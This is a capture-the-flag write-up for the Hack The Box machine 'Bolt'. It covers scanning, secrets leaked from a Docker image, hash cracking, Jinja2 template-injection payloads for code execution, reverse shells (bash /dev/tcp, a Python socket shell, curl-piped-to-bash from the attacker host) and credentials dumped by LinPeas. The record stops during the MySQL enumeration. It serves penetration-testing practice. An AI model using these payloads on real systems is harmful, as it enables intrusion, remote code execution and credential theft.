# Bolt

URL: https://app.hackthebox.com/machines/Bolt/

Level: Medium

Date: 14 Aug 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [WEB](#web)
- [Docker](#docker)
	- [Findings](#findings)
	- [Admin credential](#admin-credential)
- [Backend](#backend)
- [Vhost fuzzing](#vhost-fuzzing)
- [invite code](#invite-code)
- [Server Side Template Injection](#ssti)
- [Foothold](#foothold)
- [LinPeas](#linpeas)
- [Roundcube Database](#roundcube-database)
- [Passbolt Database](#passbolt-database)
- [Secrets?](#secrets)
- [User flag](#user-flag)
- [Privesc](#privesc)
	- [Eddie's mail](#mail)
	- [LaZagne](#lazagne)
	- [Private key](#private-key)
- [Root flag](#root-flag)



## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -p- -n 10.10.11.114 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 08:55 CEST
Nmap scan report for 10.10.11.114
Host is up (0.058s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 28.22 seconds
```

```bash
$ sudo nmap -T4 -p80,443 -n 10.10.11.114 -sC -sV -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-14 08:56 CEST
Nmap scan report for 10.10.11.114
Host is up (0.046s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds
```

### web

![](Pasted%20image%2020230814085743.png)

Let's add `passbolt.bolt.htb` to our `/etc/hosts` file

![](Pasted%20image%2020230814085902.png)

Let's try to create an account.. we get an error:

![](Pasted%20image%2020230814090218.png)

```bash
POST /register HTTP/1.1
Host: 10.10.11.114
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.114
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.114/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=sughenji&email=sugo%40htb.com&password=asdasd123
```

## Docker

We notice a download link for a Docker image (`image.tar`):

![](Pasted%20image%2020230814090450.png)

Let's extract:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ tar xvf image.tar
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/VERSION
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/json
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/VERSION
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/json
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/VERSION
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/json
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/VERSION
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/json
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/VERSION
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/json
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/VERSION
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/json
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/VERSION
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/json
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/VERSION
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/json
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar
859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/VERSION
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/json
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/VERSION
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/json
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/VERSION
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/json
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar
manifest.json
repositories
```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ cat manifest.json  | jq
[
  {
    "Config": "859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json",
    "RepoTags": [
      "flask-dashboard-adminlte_appseed-app:latest"
    ],
    "Layers": [
      "187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar",
      "745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar",
      "41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar",
      "d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar",
      "3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar",
      "9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar",
      "1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar",
      "a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar",
      "3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar",
      "2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar",
      "3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar"
    ]
  }
]
```

Meanwhile, we run `feroxbuster`

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ feroxbuster --silent -k -u https://passbolt.bolt.htb -n -t 200 -L 1 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox.txt
https://passbolt.bolt.htb/img => https://passbolt.bolt.htb/img/
https://passbolt.bolt.htb/ => https://passbolt.bolt.htb/auth/login?redirect=%2F
https://passbolt.bolt.htb/login => https://passbolt.bolt.htb/auth/login
https://passbolt.bolt.htb/register => https://passbolt.bolt.htb/users/register
https://passbolt.bolt.htb/resources => https://passbolt.bolt.htb/auth/login?redirect=%2Fresources
https://passbolt.bolt.htb/users => https://passbolt.bolt.htb/auth/login?redirect=%2Fusers
https://passbolt.bolt.htb/css => https://passbolt.bolt.htb/css/
https://passbolt.bolt.htb/groups => https://passbolt.bolt.htb/auth/login?redirect=%2Fgroups
https://passbolt.bolt.htb/js => https://passbolt.bolt.htb/js/
https://passbolt.bolt.htb/app => https://passbolt.bolt.htb/auth/login?redirect=%2Fapp
https://passbolt.bolt.htb/logout => https://passbolt.bolt.htb/auth/logout
https://passbolt.bolt.htb/fonts => https://passbolt.bolt.htb/fonts/
https://passbolt.bolt.htb/recover => https://passbolt.bolt.htb/users/recover
https://passbolt.bolt.htb/locales => https://passbolt.bolt.htb/locales/
https://passbolt.bolt.htb/roles => https://passbolt.bolt.htb/auth/login?redirect=%2Froles
..
..
```

Let's get the paths list:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ find . -maxdepth 1 -type d
.
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
```

Every directory contains a `layer.tar` file, let's extract it in every path:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ cat > paths
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
./1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
```

```bash
$ for i in $(cat ./paths); do tar xvf $i/layer.tar -C $i/ ; done
..
..
```

Let's check every Python file, we found this:

```bash
..
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/gunicorn-cfg.py
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/run.py
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py
..
```

### findings

```python
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ cat ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py
# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import os
from   decouple import config

class Config(object):

    basedir    = os.path.abspath(os.path.dirname(__file__))

    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
..
..
```

We also found:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ cat .env
DEBUG=True
SECRET_KEY=S3cr3t_K#Key
DB_ENGINE=postgresql
DB_NAME=appseed-flask
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=appseed
DB_PASS=pass
```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2$ cat db.sqlite3
▒▒▒▒▒▒k▒9tableUserUserCREATE TABLE "User" (
        id INTEGER NOT NULL,
        username VARCHAR,
        email VARCHAR,
        password BLOB,
        email_confirmed BOOLEAN,
        profile_update VARCHAR(80),
        PRIMARY KEY (id),
        UNIQUE (username),
        UNIQUE (email)
▒▒<)Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q._User_1User
▒▒      admin
▒▒)     admin@bolt.htb
```

```bash
$ strings  db.sqlite3
SQLite format 3
9tableUserUser
CREATE TABLE "User" (
        id INTEGER NOT NULL,
        username VARCHAR,
        email VARCHAR,
        password BLOB,
        email_confirmed BOOLEAN,
        profile_update VARCHAR(80),
        PRIMARY KEY (id),
        UNIQUE (username),
        UNIQUE (email)
indexsqlite_autoindex_User_2User
indexsqlite_autoindex_User_1User
adminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
        admin
)       admin@bolt.htb
```

### admin credential

```bash
$ hashcat -m 500 '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-4770K CPU @ 3.50GHz, 2870/5804 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

..
..
..
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
Time.Started.....: Sat Aug 19 19:38:15 2023 (28 secs)
Time.Estimated...: Sat Aug 19 19:38:43 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6155 H/s (10.04ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 172736/14344385 (1.20%)
Rejected.........: 0/172736 (0.00%)
Restore.Point....: 172672/14344385 (1.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: derek25 -> deadbeat
Hardware.Mon.#1..: Util: 97%

Started: Sat Aug 19 19:37:29 2023
Stopped: Sat Aug 19 19:38:45 2023

```

## backend

![](Pasted%20image%2020230819203054.png)

We see references to two potential users: `Alexander` and `Sarah`:

![](Pasted%20image%2020230822123734.png)

We also notice a reference to "Roundcube email system"

![](Pasted%20image%2020230822123804.png)

We didn't find anything among classic urls (`/mail`, `/webmail`):

![](Pasted%20image%2020230822124007.png)
## vhost fuzzing

Let's try virtual host fuzzing:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.114 -H "Host: FUZZ.bolt.htb" -fs 30347

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.114
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.bolt.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 30347
________________________________________________

mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99, Duration: 73ms]
demo                    [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 64ms]
..
..
```

We add new subdomains to `/etc/hosts`

```bash
root@kaligra:~# grep bolt /etc/hosts
10.10.11.114    passbolt.bolt.htb bolt.htb mail.bolt.htb demo.bolt.htb
```

![](Pasted%20image%2020230822124352.png)

![](Pasted%20image%2020230822124414.png)

If we try to create an account, we need to provide an invite code:

![](Pasted%20image%2020230822124502.png)

Let's check into Docker image again:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ grep -ril invite *
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/app/base/__pycache__/routes.cpython-36.pyc
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/app/base/__pycache__/forms.cpython-36.pyc
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar
```


## invite code

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt/docker$ grep -C 2 invite 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
```

![](Pasted%20image%2020230822124840.png)

We are in!


![](Pasted%20image%2020230822125028.png)
We are also able to access within Roundcube

![](Pasted%20image%2020230822125248.png)

## SSTI


We know that there is some SSTI involved here.

Let's try to change our profile:

![](Pasted%20image%2020230822130939.png)

https://github.com/payloadbox/ssti-payloads

![](Pasted%20image%2020230822131016.png)

Since we read *"Email verification is required in order to update personal information."*, we check our INBOX:

![](Pasted%20image%2020230822131142.png)

We don't see differences in backend, but we get a positive result through email confirmation:

![](Pasted%20image%2020230822131237.png)

We must obtain code execution.

Time to cheat a bit :)

We use this payload and we get RCE:

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()
}}
```

![](Pasted%20image%2020230822131923.png)

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ping -c 3 10.10.14.20').read() }}
```

We get PING back!

```bash
root@kaligra:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:21:03.848397 IP passbolt.bolt.htb > 10.10.14.20: ICMP echo request, id 1, seq 1, length 64
13:21:03.848425 IP 10.10.14.20 > passbolt.bolt.htb: ICMP echo reply, id 1, seq 1, length 64
13:21:04.853219 IP passbolt.bolt.htb > 10.10.14.20: ICMP echo request, id 1, seq 2, length 64
13:21:04.853269 IP 10.10.14.20 > passbolt.bolt.htb: ICMP echo reply, id 1, seq 2, length 64
13:21:05.851156 IP passbolt.bolt.htb > 10.10.14.20: ICMP echo request, id 1, seq 3, length 64
13:21:05.851171 IP 10.10.14.20 > passbolt.bolt.htb: ICMP echo reply, id 1, seq 3, length 64

```

Let's try this

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -i >& /dev/tcp/10.10.14.20/4444 0>&1').read() }}
```

```bash
joshua@kaligra:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

Didn't work :(

Let's try this

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.20:8080').read() }}
```

```bash
joshua@kaligra:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

This worked!!!

```bash
joshua@kaligra:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.114 - - [22/Aug/2023 13:24:58] "GET / HTTP/1.1" 200 -
```

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.20:8080 | bash').read() }}
```


Using `cat /etc/passwd` as payload:

![](Pasted%20image%2020230822153721.png)

```bash
$ sed -e 's/nologin/nologin\n/g' passwd  | sed -e 's/bash/bash\n/g' | sed -e 's/false/false\n/g' | sed -e 's/^\ //g' > passwd2
```

So far we have two local users:

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ grep bash passwd2
root:x:0:0:root:/root:/bin/bash
eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash
clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash
```


Let's create a Python reverse shell:

```python
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.20",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/bash")'
```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Payload:

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.20:8080/shell.py -o /tmp/shell.py').read() }}
```

It worked?  Seems so

```bash
10.10.11.114 - - [22/Aug/2023 15:57:51] "GET /shell.py HTTP/1.1" 200 -
```

Python didn't work.

Try again with bash

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://10.10.14.20:8080/shell.sh | bash').read() }}
```

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ cat > shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.20/4444 0>&1
```

We got shell!

## Foothold

```bash
joshua@kaligra:~/Documents/htb/machines/Bolt$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.114] 37764
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bolt:~/demo$
```

## LinPeas


Mail?

```bash
╔══════════╣ Mails (limit 50)
    72480      4 -rw-------   1 eddie    mail          909 Feb 25  2021 /var/mail/eddie
    72363      4 -rw-------   1 www-data mail            1 Mar  3  2021 /var/mail/www-data
    77189      4 -rw-------   1 root     mail            1 Mar  3  2021 /var/mail/root
    72480      4 -rw-------   1 eddie    mail          909 Feb 25  2021 /var/spool/mail/eddie
    72363      4 -rw-------   1 www-data mail            1 Mar  3  2021 /var/spool/mail/www-data
    77189      4 -rw-------   1 root     mail            1 Mar  3  2021 /var/spool/mail/root

```


"Passbolt" config files?

```bash
-rw-r----- 1 root www-data 1465 Jul 27  2021 /etc/passbolt/file_storage.php
-rw-r----- 1 root www-data 2642 Jul 27  2021 /etc/passbolt/paths.php
-rw-r----- 1 root www-data 113 Jul 27  2021 /etc/passbolt/version.php
-rw-r----- 1 root www-data 18421 Jul 27  2021 /etc/passbolt/app.php
-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php
-rw-r----- 1 root www-data 6189 Jul 27  2021 /etc/passbolt/bootstrap.php
-rw-r----- 1 root www-data 1328 Jul 27  2021 /etc/passbolt/requirements.php
-rw-r----- 1 root www-data 10365 Jul 27  2021 /etc/passbolt/default.php
-rw-r----- 1 root www-data 5601 Feb 24  2021 /etc/passbolt/passbolt.default.php
-rw-r----- 1 root www-data 886 Feb 24  2021 /etc/passbolt/bootstrap_cli.php
-rw-rw---- 1 root www-data 2609 Feb 25  2021 /etc/passbolt/gpg/serverkey.asc
-rw-rw---- 1 root www-data 5285 Feb 25  2021 /etc/passbolt/gpg/serverkey_private.asc
-rw-r----- 1 root www-data 18421 Jul 27  2021 /etc/passbolt/app.default.php

```

```
╔══════════╣ Analyzing Passbolt Files (limit 70)
-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php
 * Passbolt ~ Open source password manager for teams
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
    'EmailTransport' => [
            'host' => 'localhost',
            'port' => 587,
            'username' => null,
            'password' => null,

```

```bash
╔══════════╣ Analyzing Roundcube Files (limit 70)
drwx------ 13 www-data www-data 4096 Aug  4  2021 /var/www/roundcube
-rw-r--r-- 1 www-data www-data 3589 Mar  6  2021 /var/www/roundcube/config/config.inc.php
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
// $config['enable_installer'] = true;
$config['smtp_log'] = false;
$config['default_host'] = 'localhost';
$config['mail_domain'] = '%t';
$config['support_url'] = '';
$config['des_key'] = 'tdqy62YPNdGEeohXtJ2160bX';
$config['product_name'] = 'Bolt Webmail';
$config['plugins'] = array();
$config['drafts_mbox'] = '';
$config['junk_mbox'] = '';
$config['sent_mbox'] = '';
$config['trash_mbox'] = '';
```


```bash
══╣ Possible private SSH keys were found!
/etc/passbolt/gpg/serverkey_private.asc
/etc/ImageMagick-6/mime.xml
/var/www/dev/uploads/image.tar
/var/www/roundcube/plugins/enigma/openpgp.min.js
```


## Roundcube database

```mysql
www-data@bolt:/etc/passbolt$ mysql -uroundcubeuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 561
Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
15 rows in set (0.00 sec)

mysql> desc users;
+----------------------+--------------+------+-----+---------------------+----------------+
| Field                | Type         | Null | Key | Default             | Extra          |
+----------------------+--------------+------+-----+---------------------+----------------+
| user_id              | int unsigned | NO   | PRI | NULL                | auto_increment |
| username             | varchar(128) | NO   | MUL | NULL                |                |
| mail_host            | varchar(128) | NO   |     | NULL                |                |
| created              | datetime     | NO   |     | 1000-01-01 00:00:00 |                |
| last_login           | datetime     | YES  |     | NULL                |                |
| failed_login         | datetime     | YES  |     | NULL                |                |
| failed_login_counter | int unsigned | YES  |     | NULL                |                |
| language             | varchar(5)   | YES  |     | NULL                |                |
| preferences          | longtext     | YES  |     | NULL                |                |
+----------------------+--------------+------+-----+---------------------+----------------+
9 rows in set (0.00 sec)

mysql> select * from users;
+---------+---------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
| user_id | username      | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                       |
+---------+---------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
|       4 | sugo@bolt.htb | localhost | 2023-08-22 04:52:25 | 2023-08-22 07:32:53 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"ty4tBf81Rqc9T6Kw";} |
+---------+---------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
